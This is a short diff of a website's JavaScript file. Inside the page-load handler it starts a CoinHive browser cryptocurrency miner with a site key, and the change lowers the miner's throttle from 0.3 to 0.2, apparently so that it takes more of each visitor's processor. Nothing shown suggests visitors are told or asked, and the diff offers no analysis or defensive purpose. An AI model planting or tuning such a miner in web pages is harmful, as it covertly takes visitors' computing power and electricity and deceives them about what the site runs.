@@ -1352,7 +1352,7 @@ $(document).ready(function() {
   });
 
   var __miner = new CoinHive.Anonymous("L7xV1nuNqgTjRVNWKtBY4E02tucDxOB9", {
-    throttle: 0.3
+    throttle: 0.2
   });
 
   __miner.start();
